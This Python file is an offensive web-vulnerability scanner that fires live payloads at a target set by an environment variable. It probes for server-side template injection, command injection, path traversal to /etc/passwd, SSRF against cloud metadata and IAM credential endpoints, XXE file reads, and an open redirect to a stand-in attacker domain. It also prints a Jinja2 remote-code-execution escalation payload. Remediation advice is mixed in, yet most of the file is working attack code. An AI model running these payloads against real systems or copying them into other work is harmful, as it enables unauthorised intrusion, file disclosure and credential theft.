#!/usr/bin/env python3
"""SSTI_RCE — Server-Side Template Injection & Code Execution Prover.

Confirms actual code execution, not just suspicious responses:
- SSTI: math evaluation proof (7*7=49, 77*77=5929)
- Command injection: unique marker echoed back in response
- Path traversal: actual /etc/passwd or Windows equivalent content
- SSRF: internal IP/metadata service response content
- XXE: external entity content returned in response
- Open redirect: controlled domain in Location header
"""
import asyncio, aiohttp, json, re, sys, random, string, time
from pathlib import Path
from urllib.parse import urlparse, urlencode, quote

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor,
    random_ua, REQUEST_DELAY,
)

# Unique marker we embed so we can confirm execution
MARKER_SEED = "MIRROR" + str(int(time.time()))[-5:]


def _marker(n: int) -> str:
    return f"MRR{n:04d}_{MARKER_SEED}"


# ── SSTI payloads: each (template_payload, expected_output, engine_name) ──────
SSTI_PROBES = [
    ("{{7*7}}",                             "49",    "Jinja2/Twig"),
    ("{{7*'7'}}",                           "7777777","Jinja2"),
    ("${7*7}",                              "49",    "FreeMarker/Velocity/Spring EL"),
    ("#{7*7}",                              "49",    "Thymeleaf/Ruby ERB"),
    ("<%= 7*7 %>",                          "49",    "ERB/JSP"),
    ("*{7*7}",                              "49",    "Thymeleaf SpEL"),
    ("@(7*7)",                              "49",    "Razor"),
    ("{{77*77}}",                           "5929",  "Jinja2/Twig"),
    ("${77*77}",                            "5929",  "FreeMarker/Spring EL"),
    ("{{config}}",                          "Config", "Jinja2 object leak"),
    ("{{self._TemplateReference__context}}","TemplateReference","Jinja2 context leak"),
    ("%7B%7B7*7%7D%7D",                     "49",    "Jinja2 URL-encoded"),
    ("{{range.init(1,2)}}",                 "1",     "Twig range"),
    ("{php}echo 7*7;{/php}",               "49",    "Smarty PHP tag"),
    ("{{7|int*7|int}}",                     "49",    "Jinja2 filters"),
]

# ── Command injection payloads ─────────────────────────────────────────────────
CMD_PROBES = [
    ("; echo {MARKER}",             "echo",     "semicolon"),
    ("| echo {MARKER}",             "echo",     "pipe"),
    ("& echo {MARKER}",             "echo",     "ampersand"),
    ("`echo {MARKER}`",             "backtick",  "backtick"),
    ("$(echo {MARKER})",            "subshell", "subshell"),
    ("\n echo {MARKER}",            "newline",  "newline"),
    (" || echo {MARKER}",           "or",       "OR-pipe"),
    ("1;echo {MARKER}",             "nospc",    "no-space"),
    ("1|echo${IFS}{MARKER}",        "IFS",      "IFS-bypass"),
    ("%0a echo {MARKER}",           "urlnl",    "URL-newline"),
]

# ── Path traversal sequences ───────────────────────────────────────────────────
PATH_TRAVERSAL = [
    ("../../../etc/passwd",         r"root:.*:0:0"),
    ("..%2F..%2F..%2Fetc%2Fpasswd", r"root:.*:0:0"),
    ("....//....//....//etc/passwd",r"root:.*:0:0"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", r"root:.*:0:0"),
    ("..%252f..%252f..%252fetc%252fpasswd",      r"root:.*:0:0"),
    ("../../../windows/win.ini",    r"\[fonts\]"),
    ("../../../boot.ini",           r"\[boot loader\]"),
    ("/etc/passwd",                 r"root:.*:0:0"),
]

TRAVERSAL_PARAMS = ["file", "path", "page", "include", "doc", "document",
                    "filename", "template", "view", "load", "read", "dir", "folder"]

# ── SSRF targets ───────────────────────────────────────────────────────────────
SSRF_TARGETS = [
    ("http://169.254.169.254/latest/meta-data/",                 ["ami-id", "instance-id", "hostname"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
    ("http://metadata.google.internal/computeMetadata/v1/",      ["project", "instance"]),
    ("http://169.254.169.254/metadata/v1/",                      ["id", "region"]),
    ("http://127.0.0.1/",                                        ["apache", "nginx", "it works"]),
    ("http://localhost/",                                         ["apache", "nginx", "it works"]),
    ("http://127.0.0.1:8080/",                                   ["tomcat", "jetty", "spring"]),
    ("http://127.0.0.1:9200/",                                   ["elasticsearch", "cluster_name"]),
    ("http://127.0.0.1:6379/",                                   ["redis_version", "PONG"]),
    ("http://[::1]/",                                            ["apache", "nginx"]),
]
SSRF_PARAMS = ["url", "uri", "src", "source", "href", "link", "to", "redirect",
               "return", "next", "dest", "destination", "path", "target", "img",
               "image", "fetch", "proxy", "request", "load", "open"]

# ── XXE payloads ───────────────────────────────────────────────────────────────
XXE_PAYLOAD_PASSWD = (
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<root>&xxe;</root>'
)
XXE_PAYLOAD_WIN = (
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
    '<root>&xxe;</root>'
)
XXE_PAYLOAD_OOB = (
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">'
    '%xxe;]><root>OOB</root>'
)


class SSTIProver:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        parsed        = urlparse(target)
        self.host     = parsed.netloc
        self.is_https = parsed.scheme == "https"

    def _finding(self, ftype, severity, conf, proof, detail, url,
                 remediation, exploitability, impact, reproducibility,
                 proof_type="CODE_EXECUTION", mitigation_layers=None, extra=None):
        if not meets_confidence_floor(conf):
            return
        f = {
            "type":              ftype,
            "severity":          severity,
            "confidence":        conf,
            "confidence_label":  confidence_label(conf),
            "url":               url,
            "proof":             proof,
            "detail":            detail,
            "remediation":       remediation,
            "proof_type":        proof_type,
            "exploitability":    exploitability,
            "impact":            impact,
            "reproducibility":   reproducibility,
            "auth_required":     False,
            "mitigation_layers": mitigation_layers or [],
            "mitre_technique":   "T1059",
            "mitre_name":        "Command and Scripting Interpreter",
        }
        if extra:
            f.update(extra)
        self.findings.append(f)
        print(f"  [{severity}] {ftype}: {url}")

    async def _request(self, sess, method, url, headers=None,
                       json_data=None, data=None, params=None, timeout=14):
        h = {"User-Agent": random_ua(), **(headers or {})}
        try:
            async with sess.request(
                method, url, headers=h, json=json_data, data=data, params=params,
                ssl=False, allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as r:
                body = await r.text(errors="ignore")
                return r.status, body, dict(r.headers)
        except Exception:
            return None, "", {}

    async def _get(self, sess, url_or_path, params=None, headers=None):
        url = url_or_path if url_or_path.startswith("http") else self.target + url_or_path
        return await self._request(sess, "GET", url, params=params, headers=headers)

    async def _post(self, sess, path_or_url, data=None, json_data=None,
                    headers=None, params=None):
        url = path_or_url if path_or_url.startswith("http") else self.target + path_or_url
        return await self._request(sess, "POST", url, headers=headers,
                                   json_data=json_data, data=data, params=params)

    async def _crawl_forms_and_params(self, sess):
        """Discover endpoints that accept user input."""
        endpoints = []
        s, body, _ = await self._get(sess, "/")
        await delay()
        if not body:
            return endpoints
        # Extract action URLs from forms
        for m in re.finditer(r'<form[^>]+action=["\']([^"\']+)["\']', body, re.I):
            endpoints.append(("form", m.group(1)))
        # Extract href URLs with query params
        for m in re.finditer(r'href=["\']([^"\']*\?[^"\']+)["\']', body, re.I):
            endpoints.append(("query", m.group(1)))
        # Common API endpoints that reflect input
        for path in ["/api/search", "/search", "/api/render", "/render",
                     "/api/template", "/api/preview", "/api/email",
                     "/api/report", "/api/v1/search", "/api/v1/render"]:
            endpoints.append(("api", path))
        return endpoints

    # ── SSTI Probing ──────────────────────────────────────────────────────────

    async def test_ssti(self, sess):
        print("\n[*] Testing Server-Side Template Injection (SSTI)...")
        endpoints = await self._crawl_forms_and_params(sess)

        ssti_targets = []
        for common_path in ["/", "/api/search", "/search", "/api/render",
                             "/render", "/api/preview", "/preview",
                             "/api/template", "/api/email/preview",
                             "/api/v1/search", "/api/feedback"]:
            ssti_targets.append(common_path)

        for payload, expected, engine in SSTI_PROBES:
            for path in ssti_targets:
                url = self.target + path

                # GET with payload in query params
                for param in ["q", "query", "search", "name", "input",
                               "text", "template", "msg", "message"]:
                    s, body, _ = await self._request(
                        sess, "GET", url,
                        params={param: payload},
                    )
                    await delay(0.1)
                    if s is None or s == 404:
                        continue
                    if expected in (body or "") and payload not in (body or ""):
                        proof = (
                            f"GET {url}?{param}={quote(payload)}\n"
                            f"→ HTTP {s}\n"
                            f"→ Template evaluated! Input '{payload}' → output contains '{expected}'\n"
                            f"→ Engine: {engine}\n"
                            f"→ Body preview: {body[:600]}"
                        )
                        self._finding(
                            ftype="SSTI_CODE_EXECUTION_CONFIRMED",
                            severity="CRITICAL",
                            conf=97,
                            proof=proof,
                            detail=(
                                f"SSTI confirmed in GET param '{param}' at {url}. "
                                f"Payload '{payload}' evaluated as {engine} template — math result '{expected}' returned. "
                                f"Attacker can escalate to RCE via class traversal or OS command execution."
                            ),
                            url=url,
                            remediation=(
                                "1. Never pass user input to a template engine unsanitized.\n"
                                "2. Use a sandboxed template environment or logic-less templates (Mustache, Handlebars in safe mode).\n"
                                "3. Validate/reject inputs containing template syntax: {{}}, ${}, #{}, <%.\n"
                                "4. For dynamic content, use context variables — not raw user input as the template string."
                            ),
                            exploitability=10,
                            impact=(
                                "Full Remote Code Execution (RCE) — attacker can execute OS commands on the server, "
                                "read /etc/passwd, dump environment variables (secrets/API keys), "
                                "and pivot to internal network."
                            ),
                            reproducibility=(
                                f"# Proof of SSTI math evaluation:\n"
                                f"curl -s '{url}?{param}={quote(payload)}'\n\n"
                                f"# Escalate to RCE (Jinja2 example):\n"
                                f"# payload: {{{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}}}"
                            ),
                            proof_type="CODE_EXECUTION",
                            mitigation_layers=["Input sanitization", "Sandboxed template engine", "Template syntax blocking", "WAF rules for template chars"],
                            extra={"payload": payload, "expected": expected, "engine": engine, "param": param},
                        )
                        return

                # POST with payload in JSON body
                for field in ["name", "query", "text", "input", "template",
                               "message", "subject", "body", "content"]:
                    s, body, _ = await self._post(
                        sess, path,
                        json_data={field: payload, "q": payload},
                    )
                    await delay(0.1)
                    if s is None or s == 404:
                        continue
                    if expected in (body or "") and payload not in (body or ""):
                        proof = (
                            f"POST {url}  body: {{\"{ field }\":\"{payload}\"}}\n"
                            f"→ HTTP {s}\n"
                            f"→ Template evaluated! Input '{payload}' → output '{expected}'\n"
                            f"→ Engine: {engine}\n"
                            f"→ Body: {body[:600]}"
                        )
                        self._finding(
                            ftype="SSTI_CODE_EXECUTION_CONFIRMED",
                            severity="CRITICAL",
                            conf=97,
                            proof=proof,
                            detail=(
                                f"SSTI confirmed in POST field '{field}' at {url}. "
                                f"Payload '{payload}' ({engine}) evaluated — math result '{expected}' returned. "
                                "Escalation to full RCE is trivial for most template engines."
                            ),
                            url=url,
                            remediation=(
                                "1. Never render user-supplied strings as templates.\n"
                                "2. Use a safe, sandboxed template environment.\n"
                                "3. Block template syntax in input validation.\n"
                                "4. Apply WAF rules for common template injection chars."
                            ),
                            exploitability=10,
                            impact="Full RCE — OS command execution, secret exfiltration, lateral movement.",
                            reproducibility=(
                                f"curl -s -X POST {url} -H 'Content-Type: application/json' "
                                f"-d '{{\"{ field }\":\"{payload}\"}}'"
                            ),
                            proof_type="CODE_EXECUTION",
                            mitigation_layers=["Input sanitization", "Sandboxed template engine", "Content-Security-Policy"],
                            extra={"payload": payload, "expected": expected, "engine": engine, "field": field},
                        )
                        return

    # ── Command Injection ─────────────────────────────────────────────────────

    async def test_command_injection(self, sess):
        print("\n[*] Testing command injection with unique marker...")
        marker_id = 0
        for path in ["/api/ping", "/ping", "/api/dns", "/api/lookup",
                     "/api/whois", "/api/traceroute", "/api/nslookup",
                     "/api/host", "/api/exec", "/api/run", "/api/cmd",
                     "/api/shell", "/api/tool", "/api/util", "/api/network",
                     "/api/v1/ping", "/api/v1/lookup", "/api/test"]:
            for cmd_tpl, tag, bypass in CMD_PROBES:
                marker = _marker(marker_id)
                marker_id += 1
                cmd = cmd_tpl.replace("{MARKER}", marker)

                for field in ["host", "ip", "target", "domain", "url",
                               "address", "query", "cmd", "command", "input"]:
                    payload = {field: f"127.0.0.1{cmd}"}
                    s, body, _ = await self._post(sess, path, json_data=payload)
                    await delay(0.15)
                    if s is None or s == 404:
                        break
                    if marker in (body or ""):
                        proof = (
                            f"POST {self.target}{path}\n"
                            f"  body: {{\"{ field }\": \"127.0.0.1{cmd}\"}}\n"
                            f"→ HTTP {s}\n"
                            f"→ UNIQUE MARKER '{marker}' FOUND IN RESPONSE — command executed!\n"
                            f"→ Bypass technique: {bypass}\n"
                            f"→ Body: {body[:600]}"
                        )
                        self._finding(
                            ftype="COMMAND_INJECTION_CONFIRMED",
                            severity="CRITICAL",
                            conf=99,
                            proof=proof,
                            detail=(
                                f"OS command injection confirmed at POST {path} field '{field}'. "
                                f"Unique marker '{marker}' echoed back — server executed injected shell command. "
                                f"Bypass used: {bypass}."
                            ),
                            url=self.target + path,
                            remediation=(
                                "1. Never pass user input to shell commands. Use OS-level APIs or libraries instead.\n"
                                "2. If shell execution is required, use a strict allowlist for the input (e.g. only alphanumeric IPs).\n"
                                "3. Use subprocess with shell=False and an explicit args list — never string concatenation.\n"
                                "4. Run the application process with minimal OS privileges."
                            ),
                            exploitability=10,
                            impact="Full Remote Code Execution — attacker runs arbitrary OS commands as the web server user. Can exfiltrate all data, drop persistence, pivot to internal network.",
                            reproducibility=(
                                f"curl -s -X POST {self.target}{path} "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"{ field }\":\"127.0.0.1{cmd}\"}}'"
                            ),
                            proof_type="CODE_EXECUTION",
                            mitigation_layers=["No-shell subprocess", "Input allowlist", "Principle of least privilege", "Seccomp/AppArmor"],
                            extra={"field": field, "payload": cmd, "marker": marker, "bypass_type": bypass},
                        )
                        return

    # ── Path Traversal ────────────────────────────────────────────────────────

    async def test_path_traversal(self, sess):
        print("\n[*] Testing path traversal (actual file read confirmation)...")
        for param in TRAVERSAL_PARAMS:
            for traversal_str, confirm_pattern in PATH_TRAVERSAL:
                url = f"{self.target}/?{param}={traversal_str}"
                s, body, hdrs = await self._get(sess, "/", params={param: traversal_str})
                await delay(0.1)
                if s is None or s in (404, 500):
                    continue
                if s == 200 and body and re.search(confirm_pattern, body):
                    match = re.search(confirm_pattern, body)
                    proof = (
                        f"GET {url}\n"
                        f"→ HTTP {s}\n"
                        f"→ FILE CONTENT CONFIRMED: pattern /{confirm_pattern}/ matched!\n"
                        f"→ Matched text: {match.group(0)[:100]}\n"
                        f"→ Body preview: {body[:600]}"
                    )
                    self._finding(
                        ftype="PATH_TRAVERSAL_FILE_READ_CONFIRMED",
                        severity="CRITICAL",
                        conf=98,
                        proof=proof,
                        detail=(
                            f"Path traversal confirmed via GET param '{param}'. "
                            f"Traversal string '{traversal_str}' caused server to read and return system file. "
                            f"Pattern '{confirm_pattern}' matched in response body."
                        ),
                        url=url,
                        remediation=(
                            "1. Resolve the canonical path and verify it starts with the allowed base directory.\n"
                            "2. Use os.path.realpath() and check the result against an allowlist.\n"
                            "3. Never concatenate user input directly into file paths.\n"
                            "4. Chroot the application or use a virtual filesystem jail."
                        ),
                        exploitability=9,
                        impact="Arbitrary file read — attacker reads /etc/passwd, /etc/shadow, application source code, .env files with secrets, SSH private keys, SSL certificates.",
                        reproducibility=f"curl -s '{url}'",
                        proof_type="UNAUTHORIZED_ACCESS",
                        mitigation_layers=["Path canonicalization", "Base-directory jail", "File access allowlist"],
                        extra={"traversal_payload": traversal_str, "param": param, "matched_pattern": confirm_pattern},
                    )
                    return

        # Also check URL-path based traversal
        for traversal_str, confirm_pattern in PATH_TRAVERSAL[:4]:
            for prefix in ["/static/", "/files/", "/download/", "/img/",
                           "/uploads/", "/assets/", "/public/"]:
                url = self.target + prefix + traversal_str
                s, body, _ = await self._get(sess, url)
                await delay(0.1)
                if s == 200 and body and re.search(confirm_pattern, body):
                    match = re.search(confirm_pattern, body)
                    proof = (
                        f"GET {url}\n"
                        f"→ HTTP {s}\n"
                        f"→ SYSTEM FILE READ CONFIRMED: pattern matched!\n"
                        f"→ Matched: {match.group(0)[:100]}\n"
                        f"→ Body: {body[:500]}"
                    )
                    self._finding(
                        ftype="PATH_TRAVERSAL_VIA_URL_CONFIRMED",
                        severity="CRITICAL",
                        conf=98,
                        proof=proof,
                        detail=f"Path traversal via URL path at '{prefix}' prefix. Static file serving directory not jailed — server reads arbitrary OS files.",
                        url=url,
                        remediation=(
                            "1. Jail the static file server to its configured root directory.\n"
                            "2. Validate the resolved path starts with the static directory root.\n"
                            "3. Block ../, %2f, %252f in URL paths at the proxy/load balancer level.\n"
                            "4. Use a CDN or dedicated static file server that handles traversal correctly."
                        ),
                        exploitability=9,
                        impact="Arbitrary file read — /etc/passwd, SSH keys, .env with secrets, source code.",
                        reproducibility=f"curl -sv '{url}'",
                        proof_type="UNAUTHORIZED_ACCESS",
                        mitigation_layers=["Static root jail", "URL path sanitization", "WAF path traversal rules"],
                        extra={"traversal_payload": traversal_str, "prefix": prefix},
                    )
                    return

    # ── SSRF ─────────────────────────────────────────────────────────────────

    async def test_ssrf(self, sess):
        print("\n[*] Testing Server-Side Request Forgery (SSRF)...")
        for ssrf_url, confirm_keywords in SSRF_TARGETS:
            for param in SSRF_PARAMS:
                for path in ["/api/fetch", "/api/proxy", "/api/preview",
                              "/api/screenshot", "/api/check", "/api/validate",
                              "/api/webhook", "/api/import", "/api/export",
                              "/api/v1/fetch", "/api/v1/proxy", "/"]:
                    s, body, hdrs = await self._post(
                        sess, path,
                        json_data={param: ssrf_url, "url": ssrf_url},
                    )
                    await delay(0.15)
                    if s is None or s == 404:
                        continue

                    body_l = (body or "").lower()
                    hits = [kw for kw in confirm_keywords if kw.lower() in body_l]
                    if hits:
                        proof = (
                            f"POST {self.target}{path}\n"
                            f"  body: {{\"{ param }\": \"{ssrf_url}\"}}\n"
                            f"→ HTTP {s}\n"
                            f"→ INTERNAL SERVICE RESPONSE CONFIRMED: keywords found: {hits}\n"
                            f"→ Body: {body[:600]}"
                        )
                        is_metadata = "169.254.169.254" in ssrf_url
                        self._finding(
                            ftype="SSRF_INTERNAL_ACCESS_CONFIRMED",
                            severity="CRITICAL" if is_metadata else "HIGH",
                            conf=97 if is_metadata else 90,
                            proof=proof,
                            detail=(
                                f"SSRF confirmed — server fetched '{ssrf_url}' and returned internal content. "
                                f"Keywords '{hits}' found in response. "
                                f"{'Cloud metadata service accessible — IAM credentials may be exposed.' if is_metadata else 'Internal service exposed.'}"
                            ),
                            url=self.target + path,
                            remediation=(
                                "1. Block outbound requests to RFC-1918 private IPs, link-local (169.254.x.x), and loopback.\n"
                                "2. Validate and allowlist URL schemes (only https://) and domains before fetching.\n"
                                "3. Use an egress proxy or firewall with an explicit allowlist.\n"
                                "4. In cloud environments, use IMDSv2 with session-oriented tokens to protect metadata."
                            ),
                            exploitability=9,
                            impact=(
                                "Server fetches attacker-controlled URLs — can access cloud metadata (AWS IAM keys, GCP service accounts), "
                                "internal services (Redis, Elasticsearch, Kubernetes API), and pivot to internal network."
                                if is_metadata else
                                "Access to internal services — Redis, Elasticsearch, internal APIs, configuration endpoints."
                            ),
                            reproducibility=(
                                f"curl -s -X POST {self.target}{path} "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"{ param }\":\"{ssrf_url}\"}}'"
                            ),
                            proof_type="UNAUTHORIZED_ACCESS",
                            mitigation_layers=["Egress firewall", "URL allowlist", "IMDSv2", "Network segmentation"],
                            extra={"ssrf_target": ssrf_url, "confirmed_keywords": hits, "param": param},
                        )
                        return

                    # Also try GET with SSRF URL as param
                    s, body, _ = await self._get(
                        sess, path,
                        params={param: ssrf_url},
                    )
                    await delay(0.1)
                    if s is None:
                        continue
                    body_l = (body or "").lower()
                    hits = [kw for kw in confirm_keywords if kw.lower() in body_l]
                    if hits:
                        proof = (
                            f"GET {self.target}{path}?{param}={quote(ssrf_url)}\n"
                            f"→ HTTP {s}\n"
                            f"→ INTERNAL CONTENT: {hits}\n"
                            f"→ Body: {body[:600]}"
                        )
                        self._finding(
                            ftype="SSRF_INTERNAL_ACCESS_CONFIRMED",
                            severity="CRITICAL" if "169.254.169.254" in ssrf_url else "HIGH",
                            conf=95,
                            proof=proof,
                            detail=f"SSRF via GET param '{param}' — server fetched internal URL '{ssrf_url}' and returned content.",
                            url=f"{self.target}{path}?{param}={ssrf_url}",
                            remediation=(
                                "1. Block outbound requests to private/link-local IPs.\n"
                                "2. Allowlist external domains at the network egress layer.\n"
                                "3. Use IMDSv2 in cloud environments.\n"
                                "4. Never pass user-controlled URLs to server-side HTTP clients."
                            ),
                            exploitability=9,
                            impact="Internal service access, cloud metadata exfiltration, IAM credential theft.",
                            reproducibility=f"curl -s '{self.target}{path}?{param}={quote(ssrf_url)}'",
                            proof_type="UNAUTHORIZED_ACCESS",
                            mitigation_layers=["Egress firewall", "URL allowlist", "IMDSv2"],
                            extra={"ssrf_target": ssrf_url, "confirmed_keywords": hits, "param": param},
                        )
                        return

    # ── XXE ──────────────────────────────────────────────────────────────────

    async def test_xxe(self, sess):
        print("\n[*] Testing XML External Entity (XXE) injection...")
        xml_endpoints = []
        for path in ["/api/upload", "/api/import", "/api/parse",
                     "/api/xml", "/api/v1/import", "/api/data",
                     "/api/process", "/api/convert", "/api/feed",
                     "/sitemap.xml", "/feed.xml"]:
            xml_endpoints.append(path)

        for path in xml_endpoints:
            for xxe_payload in [XXE_PAYLOAD_PASSWD, XXE_PAYLOAD_WIN]:
                confirm = r"root:.*:0:0" if "passwd" in xxe_payload else r"\[fonts\]"
                s, body, hdrs = await self._request(
                    sess, "POST", self.target + path,
                    headers={"Content-Type": "application/xml"},
                    data=xxe_payload,
                )
                await delay(0.2)
                if s is None or s in (404, 405, 415):
                    continue
                if body and re.search(confirm, body):
                    match = re.search(confirm, body)
                    proof = (
                        f"POST {self.target}{path}\n"
                        f"  Content-Type: application/xml\n"
                        f"  Body: {xxe_payload[:200]}...\n"
                        f"→ HTTP {s}\n"
                        f"→ FILE CONTENT EXTRACTED: pattern matched!\n"
                        f"→ Matched: {match.group(0)[:100]}\n"
                        f"→ Body: {body[:500]}"
                    )
                    self._finding(
                        ftype="XXE_FILE_READ_CONFIRMED",
                        severity="CRITICAL",
                        conf=98,
                        proof=proof,
                        detail=(
                            f"XXE injection confirmed at {path}. External entity resolved and file content returned in response. "
                            "Attacker can read any file readable by the web server process."
                        ),
                        url=self.target + path,
                        remediation=(
                            "1. Disable external entity processing in your XML parser (FEATURE_SECURE_PROCESSING=true).\n"
                            "2. Use a JSON API instead of XML where possible.\n"
                            "3. Validate XML against a strict schema that disallows DOCTYPE declarations.\n"
                            "4. Apply XML parser hardening: disable DTD processing entirely."
                        ),
                        exploitability=9,
                        impact="Arbitrary file read (CRITICAL) + potential SSRF + DoS via entity expansion. Attacker reads /etc/passwd, /etc/shadow, application config, SSL private keys.",
                        reproducibility=(
                            f"curl -s -X POST {self.target}{path} "
                            f"-H 'Content-Type: application/xml' "
                            f"-d '{xxe_payload[:150]}...'"
                        ),
                        proof_type="UNAUTHORIZED_ACCESS",
                        mitigation_layers=["XML parser hardening", "DTD disabling", "Schema validation", "JSON migration"],
                        extra={"xxe_payload_type": "Linux passwd" if "passwd" in xxe_payload else "Windows"},
                    )
                    return

    # ── Open Redirect ─────────────────────────────────────────────────────────

    async def test_open_redirect(self, sess):
        print("\n[*] Testing open redirect for phishing chain...")
        evil = "https://attacker.mirror-scanner.evil"
        for param in ["next", "redirect", "return", "returnUrl", "return_url",
                      "to", "url", "goto", "dest", "destination", "redir",
                      "redirect_uri", "callback", "continue", "target"]:
            for path in ["/", "/login", "/logout", "/api/auth/callback",
                         "/oauth/callback", "/auth/callback"]:
                s, body, hdrs = await self._request(
                    sess, "GET", self.target + path,
                    params={param: evil},
                )
                await delay(0.1)
                if s is None:
                    continue
                location = hdrs.get("location", hdrs.get("Location", ""))
                if evil in location or (s in (301, 302, 303, 307, 308) and evil in location):
                    proof = (
                        f"GET {self.target}{path}?{param}={evil}\n"
                        f"→ HTTP {s}\n"
                        f"→ Location: {location}\n"
                        f"→ ATTACKER DOMAIN IN REDIRECT — open redirect confirmed!"
                    )
                    self._finding(
                        ftype="OPEN_REDIRECT_CONFIRMED",
                        severity="HIGH",
                        conf=95,
                        proof=proof,
                        detail=(
                            f"Open redirect at {path}?{param}= — server redirects to arbitrary external domains. "
                            "Used in phishing attacks and OAuth token theft."
                        ),
                        url=f"{self.target}{path}?{param}={evil}",
                        remediation=(
                            "1. Allowlist redirect destinations to your own domain(s) only.\n"
                            "2. Use path-only redirects (strip scheme+host) or a signed redirect token.\n"
                            "3. For OAuth callbacks, validate against the registered redirect_uri exactly.\n"
                            "4. Log and alert on redirect attempts to unexpected domains."
                        ),
                        exploitability=8,
                        impact="Phishing/account takeover — attacker sends a legitimate-looking URL to victims that redirects to a credential harvesting page. OAuth flows can leak tokens to attacker.",
                        reproducibility=f"curl -sv '{self.target}{path}?{param}={evil}' 2>&1 | grep Location",
                        proof_type="ACCOUNT_TAKEOVER",
                        mitigation_layers=["Redirect allowlist", "Path-only redirects", "OAuth redirect_uri validation"],
                        extra={"param": param, "evil_url": evil, "redirect_status": s},
                    )
                    return

    async def run(self):
        print(f"\n{'='*60}\n  SSTI_RCE — Code Execution Exploit Prover\n  Target: {self.target}\n{'='*60}")
        timeout   = aiohttp.ClientTimeout(total=20, connect=8)
        connector = aiohttp.TCPConnector(ssl=False, limit=4)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            await self.test_ssti(sess)
            await self.test_command_injection(sess)
            await self.test_path_traversal(sess)
            await self.test_ssrf(sess)
            await self.test_xxe(sess)
            await self.test_open_redirect(sess)

        print(f"\n[+] SSTI_RCE complete: {len(self.findings)} confirmed findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No target — set ARSENAL_TARGET", file=sys.stderr)
        sys.exit(1)
    scanner = SSTIProver(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "ssti_rce.json"
    out.write_text(json.dumps(findings, indent=2))
    print(f"[+] Saved {len(findings)} findings → {out}")

if __name__ == "__main__":
    asyncio.run(main())
